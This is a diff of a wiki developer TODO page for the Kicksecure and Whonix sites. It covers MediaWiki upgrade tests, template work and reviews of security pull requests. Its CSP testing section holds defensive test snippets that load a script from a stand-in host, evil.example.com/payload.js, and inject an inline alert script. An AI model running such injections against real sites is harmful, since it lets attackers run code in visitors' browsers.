@@ -450,10 +450,126 @@ Template:Stub
 </pre>
 
 = TODO DEV =
-== next ai review ==
-* https://github.com/org-ai-assisted/kicksecure-wiki-backup/pull/2
-* https://github.com/assisted-by-ai/mediawiki-customized-dist/pull/8
-* note: wiki header print function seems broken anyhow (header menu is open and overlaying website) but since nobody reported that yet, the feature seems too unimportant to fix it
+== mediawiki update to 1.45.2 ==
+* done
+* pls check [[dev/wikitest]] - all good still?
+
+'''DEV'''
+* In progress
+* All tests were checked. Changes cannot be traced back exactly to the newest version
+* {{IconSet|true|As expected}} Anchor
+* {{IconSet|false|Problems}} Blockquote and quotation
+** Test 1.1: The lines don't work as expected. The first and the last line are separated which is new
+** Test 3: The multi line bullet point blockquote still doesn't work (Mediawiki bug, reported, see Test4.broken)
+** Test 4.2/.3/.4 don't work
+*** If it's "only" 2 lines then a line gap will be ignored for NAMED parameters
+*** This was tested with testTemplate where the Quotation templates was imitated (in minimal fashion). With an unnamed parameter it worked with "quote" as parameter it did not work
+*** Strangely if there's 3 lines or more it works again
+*** This seems to be a bug, probably in the new Parsoid parser
+** Test 4.broken: The broken test is still broken. The blockquote HTML inside ul > li is valid HTML, but the parser does not accept it
+* {{IconSet|true|As expected}} CodeSelect
+* {{IconSet|true|As expected}} Collapsible
+* {{IconSet|true|As expected}} Community Support
+* {{IconSet|true|As expected}} Extension CSS - '''But still needs the improvements to pass all tests'''
+* {{IconSet|true|As expected}} CustomRepo - Tests were improved (previously not very intuitive)
+
+== content improvements ==
+
+=== Whonix KVM wiki content improvement ===
+* https://www.whonix.org/wiki/KVM
+* similar to VirtualBox wiki page
+
+=== Whonix Windows Installer wiki content improvement ===
+* https://www.whonix.org/wiki/Windows_Quick_Start_Testers_Only_Version
+* similar to VirtualBox wiki page
+
+== consider multiwiki additions ==
+* [[Template:Footer]]
+* [[Template:Reflist]]
+* [[Template:Html_Donation_Panel_Crypto]]
+* [[Template:BootEntries]]
+* default: yes, make multi wiki if sensible even if not yet in use
+
+'''DEV'''
+# Footer is very similar. Tm is different. We would need a switch for that either in the template or in the widget
+#* {{IconSet|maybe|Question}} While researching this, I found that Widget:Footer has a wrong way of commenting out a block of code <code><nowiki><!-- --></nowiki></code> is not good for blocks in widgets, because the php smarty code is also wrapped in html comments in widgets.
+#** So if you wrap a block with php smarty code, then closing tag of the comment within might end the outer comment. The parser does it accidentally right, but it's formally wrong
+#** If have thought of the best solution in this context which I think is a wrapper like this, see Note 1 below
+#** I suggest one of 2 things (1) Create a new editor button (in the hidden advanced section), so editors can just select the block and click the button or (2) Document this somewhere in the documentation, so an editor can find it there -- I would prefer version 1, it's easily implemented
+# Reflist is basically the same. Can be easily changed to Multiwiki
+# Html_Donation_Panel_Crypto is already Multiwiki ready
+# BootEntries SEEMS Multiwiki ready, but Dev does not know if there's a difference for how it works on Kicksecure and Whonix
+# {{IconSet|maybe|Question}} I also noticed that the updating on Whonix does not automatically work from our script. Is Whonix wiki still supposed to be synchronized with Kicksecure wiki? - And is the mw-multi-wiki action still in use?
+
+Note 1 <pre>
+<!--{* This block below is deactivated if to /if *}-->
+<!--{if false}-->
+mycontent
+<!--{/if}-->
+</pre>
+
+'''DEV'''
+* Admin says multiwiki where possible
+
+= WAITING ON =
+
+= REVIEW PLEASE =
+
+== test cross site scripting and css is blocked by CSP ==
+* the CSP is supposed to block cross-site JS/CSS
+* should be blocked already by CSP: yes
+* cross site scripting should NOT work: expected blocked by CSP
+* cross site CSS should NOT work: expected blocked by CSP
+* please test:
+** can kicksecure.com use javascript hosted from whonix.org? expected: NO
+** can kicksecure.com use CSS hosted on whonix.org? expected: NO
+* failure case: if cross-site JS/CSS is possible, that would mean CSP is broken
+
+'''DEV'''
+* Done
+* This was tested by the test cases below
+* So the tests were "successful", but not of our own doing, but because of the browser fallback to default-src: self.
+* Here's maybe better suggestions with my own research and Ai support
+*# Default stays self, blob: also allowed (Javascript created blob loading)
+*# script-src only from self
+*# script-src-attr: none - means no inline Javascript. As we have now replaced "javascript:print()" - maybe there are no attribute-Javascripts left?
+*# style-src is for CSS files, style-src-attr ist for style="" which we regularely use and so cannot deactivate
+*# object-src none prevents Flash and Java on the page, so should be a no-brainer
+*# frame-ancestors 'self' secures against foreign frames or iframes embedding
+*# form-action - only using our own forms from our website, or paypal.com
+*# base-uri - we don't use base tags, but it's "free", so better be safe
+
+<pre>
+content-security-policy:
+    default-src 'self' data: blob:;
+    script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:;
+    script-src-attr 'none';
+    style-src 'self' 'unsafe-inline' blob:;
+    style-src-attr 'self' 'unsafe-inline';
+    object-src 'none';
+    frame-ancestors 'self';
+    form-action 'self' https://www.paypal.com;
+    base-uri 'self';
+</pre>
+
+'''Tests'''
+<pre>
+// Test case 1 : Add a script via console just for my browser session
+// Result : Loading the script 'https://evil.example.com/payload.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
+var evilScript = document.createElement('script');
+evilScript.src = 'https://evil.example.com/payload.js'; 
+document.body.appendChild(evilScript);
+
+// Test case 2 : Inject JS directly via console
+// Result : Not executed, also because of default-src: self
+document.body.innerHTML += '<script>alert("XSS by editor possible!")<\/script>';
+
+// Test case 3 : Use widget to load js and CSS
+// Results:
+// Loading the script 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.js' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.Understand this error
+// Loading the stylesheet 'https://www.whonix.org/mw-autogen/src-copy/CodeSelect.css' violates the following Content Security Policy directive: "default-src 'self' data: 'unsafe-inline' 'unsafe-eval' blob:". Note that 'style-src-elem' was not explicitly set, so 'default-src' is used as a fallback. The action has been blocked.
+</pre>
+
 
 == css extension fork tests ==
 * Write tests on wikitest page and check result with JS
@@ -513,61 +629,52 @@ Patrick:
 * I posted link to wrong PR
 * please review: https://github.com/org-ai-assisted/mediawiki-extensions-CSS/pull/5
 
-== test cross site scripting and css is blocked by CSP ==
-* the CSP is supposed to block cross-site JS/CSS
-* should be blocked already by CSP: yes
-* cross site scripting should NOT work: expected blocked by CSP
-* cross site CSS should NOT work: expected blocked by CSP
-* please test:
-** can kicksecure.com use javascript hosted from whonix.org? expected: NO
-** can kicksecure.com use CSS hosted on whonix.org? expected: NO
-* failure case: if cross-site JS/CSS is possible, that would mean CSP is broken
+'''DEV'''
+* Done
+* {{IconSet|maybe|Tendentially Approve}} The new solution is very restrictive. However, the 2 cases that this would really prevent might not be relevant for us and are not used currently.
+*# Unicode characters like äöü or other languages than english
+*# References with query parameters like <code><nowiki>{{#css:/load.php?module=ext.myCss}}</nowiki></code>
 
-== mediawiki update to 1.45.2 ==
-* done
-* pls check [[dev/wikitest]] - all good still?
-
-== content improvements ==
-
-=== Whonix KVM wiki content improvement ===
-* https://www.whonix.org/wiki/KVM
-* similar to VirtualBox wiki page
-
-=== Whonix Windows Installer wiki content improvement ===
-* https://www.whonix.org/wiki/Windows_Quick_Start_Testers_Only_Version
-* similar to VirtualBox wiki page
-
-== consider multiwiki additions ==
-* [[Template:Footer]]
-* [[Template:Reflist]]
-* [[Template:Html_Donation_Panel_Crypto]]
-* [[Template:BootEntries]]
-* default: yes, make multi wiki if sensible even if not yet in use
+== next ai review ==
+* https://github.com/org-ai-assisted/kicksecure-wiki-backup/pull/2
+* https://github.com/assisted-by-ai/mediawiki-customized-dist/pull/8
+* note: wiki header print function seems broken anyhow (header menu is open and overlaying website) but since nobody reported that yet, the feature seems too unimportant to fix it
 
 '''DEV'''
-# Footer is very similar. Tm is different. We would need a switch for that either in the template or in the widget
-#* {{IconSet|maybe|Question}} While researching this, I found that Widget:Footer has a wrong way of commenting out a block of code <code><nowiki><!-- --></nowiki></code> is not good for blocks in widgets, because the php smarty code is also wrapped in html comments in widgets.
-#** So if you wrap a block with php smarty code, then closing tag of the comment within might end the outer comment. The parser does it accidentally right, but it's formally wrong
-#** If have thought of the best solution in this context which I think is a wrapper like this, see Note 1 below
-#** I suggest one of 2 things (1) Create a new editor button (in the hidden advanced section), so editors can just select the block and click the button or (2) Document this somewhere in the documentation, so an editor can find it there -- I would prefer version 1, it's easily implemented
-# Reflist is basically the same. Can be easily changed to Multiwiki
-# Html_Donation_Panel_Crypto is already Multiwiki ready
-# BootEntries SEEMS Multiwiki ready, but Dev does not know if there's a difference for how it works on Kicksecure and Whonix
-# {{IconSet|maybe|Question}} I also noticed that the updating on Whonix does not automatically work from our script. Is Whonix wiki still supposed to be synchronized with Kicksecure wiki? - And is the mw-multi-wiki action still in use?
-
-Note 1 <pre>
-<!--{* This block below is deactivated if to /if *}-->
-<!--{if false}-->
-mycontent
-<!--{/if}-->
-</pre>
-
-'''DEV'''
-* Admin says multiwiki where possible
-
-= WAITING ON =
-
-= REVIEW PLEASE =
+* Done
+* https://github.com/org-ai-assisted/kicksecure-wiki-backup/pull/2
+** mediawiki-shared/src/shared/CodeSelect.js
+*** {{IconSet|maybe|APPROVED}} This is a high knowledge fix against XSS via jQuery-Parsing. '''BUT please make Ai add a one or two-line comment''' to explain this, because this is not at all intuitive for most human developers.
+** mediawiki-shared/src/shared/Header.js
+*** {{IconSet|true|APPROVED}} This basically fixes a Mediawiki remnant. Modern browsers reject direct JavaScript URLs more and more. So in the near future, this print-link might not work anymore in most browsers. To keep it functioning this script is added.
+* https://github.com/assisted-by-ai/mediawiki-customized-dist/pull/8
+** Widget:Download_Button.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:EagerImage.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:ExtLink.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:FlyInNotification.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:Footer.mw
+*** {{IconSet|true|APPROVED}} HTML escaping and add rel noopener as shielding links against Javascript access from the opened site
+** Widget:Header.mw
+*** {{IconSet|true|APPROVED}} New print action handled in the other pull
+** Widget:HtmlComment.mw
+*** {{IconSet|maybe|APPROVED}} Security improvement '''BUT please make Ai add a one or two-line comment''' to explain this. This is too high level for a normal dev to understand. The old version was pretty clear. The new version takes into account the tolerant browser behavior for comment closing tags and basically puts a space between any dash that is followed by a dash. This works but is incomprehensible for a Dev without this deep knowledge
+** Widget:LeftRightImageText.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:Page_Homepage.mw
+*** {{IconSet|true|APPROVED}} add rel noopener as shielding links against Javascript access from the opened site
+** Widget:SitenoticeBanner.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:SVG.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+** Widget:VideoLink.mw
+*** {{IconSet|true|APPROVED}} add rel noopener as shielding links against Javascript access from the opened site
+** Widget:WikiBookIndex.mw
+*** {{IconSet|true|APPROVED}} Security regexp improvement and small restructure
+* {{IconSet|false|Request}} Please let Ai change all the comments on the pages with "Security regexp improvement and small restructure". They have a common security feature which was inadequately (way too short and cryptically) described on LeftRightImage. I have already devised and approved this detailed description. All the script comments should link to this description for explanation https://www.kicksecure.com/wiki/Dev/mediawiki#Security_sanitisation_for_URL_parameters
 
 = Footnotes =
 <references />
